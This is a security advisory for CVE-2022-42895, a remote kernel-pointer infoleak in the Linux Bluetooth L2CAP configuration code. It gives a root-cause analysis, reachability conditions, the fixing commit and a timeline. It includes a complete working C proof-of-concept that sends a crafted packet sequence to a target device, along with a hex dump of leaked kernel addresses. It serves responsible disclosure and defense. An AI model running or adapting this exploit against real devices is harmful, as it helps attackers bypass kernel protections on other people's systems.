---
title: 'Linux Kernel: Infoleak in Bluetooth L2CAP Handling'
severity: Moderate
ghsa_id: GHSA-vccx-8h74-2357
cve_id: CVE-2022-42895
weaknesses: []
products:
- ecosystem: Linux
  package_name: Kernel
  affected_versions: '> v3.0.0'
  patched_versions: ''
cvss: null
credits:
- github_user_id: koczkatamas
  name: Tamás Koczka
  avatar: https://avatars.githubusercontent.com/u/2608082?s=40&v=4
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

### Summary
There is an infoleak vulnerability in the Linux kernel's `net/bluetooth/l2cap_core.c`'s `l2cap_parse_conf_req` function which can be used to leak kernel pointers remotely.

The bug was introduced in [commit 42dceae](https://github.com/torvalds/linux/commit/42dceae2819b5ac6fc9a0d414ae05a8960e2a1d9) (version: 3.0.0, date: 2011-Oct-17).

### Severity
Moderate - The leak in Bluetooth L2CAP handling can be used to leak kernel pointers remotely.

### Proof of Concept
The bug can be triggered remotely on a KASAN-enabled kernel with the PoC below. Tested on Ubuntu 22.04, precondition: HighSpeed support needs to be enabled via e.g. `btmgmt hs on`

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define AMP_MGR_CID 0x03

typedef struct {
  uint8_t  code;
  uint8_t  ident;
  uint16_t len;
} __attribute__ ((packed)) amp_mgr_hdr;
#define AMP_MGR_HDR_SIZE 4

#define AMP_INFO_REQ 0x06
typedef struct {
  uint8_t id;
} __attribute__ ((packed)) amp_info_req_parms;

typedef struct {
  uint8_t  mode;
  uint8_t  txwin_size;
  uint8_t  max_transmit;
  uint16_t retrans_timeout;
  uint16_t monitor_timeout;
  uint16_t max_pdu_size;
} __attribute__ ((packed)) l2cap_conf_rfc;

typedef struct {
  uint8_t id;
  uint8_t stype;
  uint16_t msdu;
  uint32_t sdu_itime;
  uint32_t acc_lat;
  uint32_t flush_to;
} __attribute__((packed)) l2cap_conf_efs;

static void hexDump(const void *data, size_t size) {
  size_t i;
  for(i = 0; i < size; i++) {
    printf("%02hhX%c", ((char *)data)[i], (i + 1) % 16 ? ' ' : '\n');
  }
  printf("\n");
}

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t data_length) {
  uint8_t type = HCI_ACLDATA_PKT;
  uint16_t BCflag = 0x0000;
  uint16_t PBflag = 0x0002;
  uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;

  hci_acl_hdr hdr;
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3];

  iv[0].iov_base = &type;
  iv[0].iov_len = 1;
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

int hci_send_cmd_data(int hci_socket, uint8_t ogf, uint8_t ocf, void *data, uint16_t data_length) {
  uint8_t type = HCI_COMMAND_PKT;

  hci_command_hdr hdr;
  hdr.opcode = cmd_opcode_pack(ogf, ocf);
  hdr.plen = data_length;

  struct iovec iv[3];

  iv[0].iov_base = &type;
  iv[0].iov_len = 1;
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_COMMAND_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    return 1;
  }

  bdaddr_t dst_addr;
  str2ba(argv[1], &dst_addr);

  int hci_socket = socket(AF_BLUETOOTH, SOCK_RAW, HCI_CHANNEL_USER);

  struct sockaddr_hci addr;
  memset(&addr, 0, sizeof(addr));
  addr.hci_family = AF_BLUETOOTH;
  addr.hci_dev = 0;
  addr.hci_channel = HCI_CHANNEL_USER;
  bind(hci_socket, (struct sockaddr *) &addr, sizeof(addr));

  create_conn_cp params;
  bacpy(&params.bdaddr, &dst_addr);
  params.pkt_type = 0xcc18;
  params.pscan_rep_mode = 2;
  params.pscan_mode = 0;
  params.clock_offset = 0;
  params.role_switch = 1;

  hci_send_cmd_data(hci_socket, OGF_LINK_CTL, OCF_CREATE_CONN, &params, sizeof(params));

  // TODO: fetch handle
  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_socket, buf, sizeof(buf)) < 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_EVENT_PKT) {
      break;
    }
  }

  uint16_t hci_handle = 0x100;

  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_socket, buf, sizeof(buf)) < 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_ACLDATA_PKT) {
      l2cap_cmd_hdr *l2_cmd_hdr = (l2cap_cmd_hdr *)&buf[9];
      if (l2_cmd_hdr->code == L2CAP_INFO_REQ) {
        break;
      }
    }
  }

  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_info_req info_req;
  } packet5 = {0};
  packet5.hdr.len = htobs(sizeof(packet5) - L2CAP_HDR_SIZE);
  packet5.hdr.cid = htobs(1);
  packet5.cmd_hdr.code = L2CAP_INFO_REQ;
  packet5.cmd_hdr.ident = 1; // TODO: take ident from request
  packet5.cmd_hdr.len =
      htobs(sizeof(packet5) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  packet5.info_req.type = htobs(L2CAP_IT_FEAT_MASK);
  hci_send_acl_data(hci_socket, hci_handle, &packet5, sizeof(packet5));

  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_socket, buf, sizeof(buf)) < 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_ACLDATA_PKT) {
      l2cap_cmd_hdr *l2_cmd_hdr = (l2cap_cmd_hdr *)&buf[9];
      if (l2_cmd_hdr->code == L2CAP_INFO_RSP) {
        break;
      }
    }
  }

  // Make __l2cap_efs_supported true
  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_info_rsp info_rsp;
    uint32_t val;
  } packet3 = {0};
  packet3.hdr.len = htobs(sizeof(packet3) - L2CAP_HDR_SIZE);
  packet3.hdr.cid = htobs(1);
  packet3.cmd_hdr.code = L2CAP_INFO_RSP;
  packet3.cmd_hdr.ident = 1; // TODO: take ident from request
  packet3.cmd_hdr.len =
      htobs(sizeof(packet3) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  packet3.info_rsp.type = htobs(L2CAP_IT_FEAT_MASK);
  packet3.info_rsp.result = htobs(L2CAP_IR_SUCCESS);
  packet3.val = L2CAP_FEAT_EXT_FLOW | L2CAP_FEAT_FIXED_CHAN | L2CAP_FEAT_ERTM;
  hci_send_acl_data(hci_socket, hci_handle, &packet3, sizeof(packet3));

  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_socket, buf, sizeof(buf)) < 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_ACLDATA_PKT) {
      l2cap_cmd_hdr *l2_cmd_hdr = (l2cap_cmd_hdr *)&buf[9];
      if (l2_cmd_hdr->code == L2CAP_INFO_REQ) {
        break;
      }
    }
  }

  struct {
    l2cap_hdr hdr;
  } packet0 = {0};
  packet0.hdr.len = htobs(sizeof(packet0) - L2CAP_HDR_SIZE);
  packet0.hdr.cid = htobs(AMP_MGR_CID);
  hci_send_acl_data(hci_socket, hci_handle, &packet0, sizeof(packet0));

  // Trigger l2cap_build_conf_req
  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conn_rsp conn_rsp;
  } packet4 = {0};
  packet4.hdr.len = htobs(sizeof(packet4) - L2CAP_HDR_SIZE);
  packet4.hdr.cid = htobs(1);
  packet4.cmd_hdr.code = L2CAP_CONN_RSP;
  packet4.cmd_hdr.ident = 1;
  packet4.cmd_hdr.len = htobs(sizeof(packet4) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  packet4.conn_rsp.scid = htobs(AMP_MGR_CID);
  packet4.conn_rsp.dcid = htobs(AMP_MGR_CID);
  packet4.conn_rsp.result = htobs(L2CAP_CR_SUCCESS);
  packet4.conn_rsp.status = htobs(0);
  hci_send_acl_data(hci_socket, hci_handle, &packet4, sizeof(packet4));

  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_socket, buf, sizeof(buf)) < 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_ACLDATA_PKT) {
      l2cap_cmd_hdr *l2_cmd_hdr = (l2cap_cmd_hdr *)&buf[9];
      if (l2_cmd_hdr->code == L2CAP_CONF_REQ) {
        break;
      }
    }
  }

  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conf_req conf_req;
    l2cap_conf_opt conf_opt;
    l2cap_conf_rfc conf_rfc;
  } packet2 = {0};
  packet2.hdr.len = htobs(sizeof(packet2) - L2CAP_HDR_SIZE);
  packet2.hdr.cid = htobs(1);
  packet2.cmd_hdr.code = L2CAP_CONF_REQ;
  packet2.cmd_hdr.ident = 1;
  packet2.cmd_hdr.len =
      htobs(sizeof(packet2) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  packet2.conf_req.dcid = htobs(AMP_MGR_CID);
  packet2.conf_req.flags = htobs(0);
  packet2.conf_opt.type = L2CAP_CONF_RFC;
  packet2.conf_opt.len = sizeof(l2cap_conf_rfc);
  packet2.conf_rfc.mode = L2CAP_MODE_ERTM;
  hci_send_acl_data(hci_socket, hci_handle, &packet2, sizeof(packet2));

  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_socket, buf, sizeof(buf)) < 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_ACLDATA_PKT) {
      l2cap_cmd_hdr *l2_cmd_hdr = (l2cap_cmd_hdr *)&buf[9];
      if (l2_cmd_hdr->code == L2CAP_CONF_RSP) {
        hexDump(buf, sizeof(buf));
        break;
      }
    }
  }
  
  close(hci_socket);

  return 0;
}
```

### Further Analysis
[Commit 42dceae](https://github.com/torvalds/linux/commit/42dceae2819b5ac6fc9a0d414ae05a8960e2a1d9) added parsing `Extended Flow Specification` option in `L2CAP Config Request`, which uses a local `struct l2cap_conf_efs efs` on the stack which is normally initialized with data sent remotely (and `remote_efs` is set to 1). This structure is also written back to the remote client (as a confirmation of successful configuration change).

The problem is [this code path](https://github.com/torvalds/linux/blob/725737e7c21d2d25a4312c2aaa82a52bd03e3126/net/bluetooth/l2cap_core.c#L3765) checks the `FLAG_EFS_ENABLE` channel flag instead of the `remote_efs` variable to decide if the `l2cap_conf_efs efs` struct should be used or not and it is possible to set the `FLAG_EFS_ENABLE` flag without actually sending EFS configuration data and in this case the uninitialized `l2cap_conf_efs efs` struct will be sent back to the remote client thus leaking information about kernel memory contents, including kernel pointers.

```c
static int l2cap_parse_conf_req(...)
{
    struct l2cap_conf_efs efs; // not initialized
    u8 remote_efs = 0;
    ...

        case L2CAP_CONF_EFS: // path not taken
        ...
            remote_efs = 1;
            memcpy(&efs, (void *) val, olen);
            break;
    ...

        switch (chan->mode) {
        case L2CAP_MODE_STREAMING:
        case L2CAP_MODE_ERTM:
        ...
            if (remote_efs) { // path not taken
                if (__l2cap_efs_supported(chan->conn))
                    set_bit(FLAG_EFS_ENABLE, &chan->flags); // invalid expectation: FLAG_EFS_ENABLE is set only if remote_efs is true
                else
                    return -ECONNREFUSED;
             }
             ...

                 if (test_bit(FLAG_EFS_ENABLE, &chan->flags)) {
                     ...
                     // leaks uninitialized efs variable
                     l2cap_add_conf_opt(&ptr, L2CAP_CONF_EFS,
                         sizeof(efs), (unsigned long) &efs, endptr - ptr);
                 }
```
The `FLAG_EFS_ENABLE` flag [can also be set](https://github.com/torvalds/linux/blob/725737e7c21d2d25a4312c2aaa82a52bd03e3126/net/bluetooth/l2cap_core.c#L3481) on the channel at other places by [satisfying the requirements](https://github.com/torvalds/linux/blob/725737e7c21d2d25a4312c2aaa82a52bd03e3126/net/bluetooth/l2cap_core.c#L3359) of `__l2cap_efs_supported`:

```c
static inline bool __l2cap_efs_supported(struct l2cap_conn *conn)
{
        return ((conn->local_fixed_chan & L2CAP_FC_A2MP) &&
                (conn->feat_mask & L2CAP_FEAT_EXT_FLOW));
}
```
1) `L2CAP_FC_A2MP` local channel availability: this requires `HCI_HS_ENABLED` to be [enabled](https://github.com/torvalds/linux/blob/725737e7c21d2d25a4312c2aaa82a52bd03e3126/net/bluetooth/l2cap_core.c#L7784) which can be achieved via the BT management interface, by e.g. calling `btmgmt hs on` (it is off by default on the systems used for testing) 

2) `L2CAP_FEAT_EXT_FLOW` feature mask: which can be [turned on](https://github.com/torvalds/linux/blob/725737e7c21d2d25a4312c2aaa82a52bd03e3126/net/bluetooth/l2cap_core.c#L4788) via the `L2CAP_INFO_RSP` command.

To actually set the `FLAG_EFS_ENABLE` flag `l2cap_build_conf_req` needs to be called, which can be done e.g. via the L2CAP_CONN_RSP command.

**Sample Packet of Leaked Information**
```
02 00 21 2F 00 2B 00 01 00 05 01 27 00 03 00 00
00 00 00 01 02 A0 02 04 09 03 00 00 D0 07 E0 2E
00 00 06 10 21 ED BF 8E FF FF FF FF 80 00 E3 8D
FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00
```
The following pointers were confirmed to be valid addresses from the kernel space:
```
21 ED BF 8E FF FF FF FF = 0xffffffff8ebfed21
80 00 E3 8D FF FF FF FF = 0xffffffff8de30080
```

**Reachability**

The affected code path is reached via A2MP which depends on the `CONFIG_BT_HS` (Bluetooth High Speed) kernel [config](https://github.com/torvalds/linux/blob/60891ec99e141b74544d11e897a245ef06263052/net/bluetooth/Kconfig#L65) which is disabled by default, but it is enabled on some well-known distributions (including Ubuntu).

Also `HCI_HS_ENABLED` needs to be true, which can be turned on via the management interface, but we are not aware of any configuration currently where it is turned on by default.

### Patch

The vulnerability was fixed by also checking if `remote_efs` is true in commit [b1a2cd5](https://github.com/torvalds/linux/commit/b1a2cd50c0357f243b7435a732b4e62ba3157a2e).

### Timeline
**Date reported**: 10/06/2022
**Date fixed**: 10/26/2022
**Date disclosed**: 11/28/2022